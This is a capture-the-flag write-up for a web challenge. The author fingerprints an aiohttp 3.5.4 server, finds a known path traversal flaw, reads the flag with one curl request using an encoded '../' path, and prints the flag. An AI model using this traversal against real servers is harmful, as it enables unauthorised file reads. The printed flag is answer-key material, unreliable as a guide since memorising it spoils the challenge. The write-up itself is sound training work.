# information

Will you be able to find the **flag** in the **universe/** ?

I've been told that the guy who wrote this nice application called **server.py** is a huge fan of **nano** (yeah... he knows **vim** is better).

http://exploring-the-universe.ctf.insecurity-insa.fr/

# solution

From BURP Suite I pick up this :

HTTP/1.1 200 OK
DT: DT_REG
Content-Type: application/javascript
Content-Length: 21989
Date: Sat, 04 May 2019 10:30:25 GMT
Server: **Python/3.7 aiohttp/3.5.4**
Connection: close

Invoking Google with this : "aiohttp/3.5.4 vuln"

1st link : https://snyk.io/vuln/SNYK-PYTHON-AIOHTTP-40582

Now let's exploit this vuln :

curl https://exploring-the-universe.ctf.insecurity-insa.fr/%2e%2e/universe/flag

# flag

INSA{3e508f6e93fb2b6de561d5277f2a9b26bc79c5f349c467a91dd12769232c1a29}
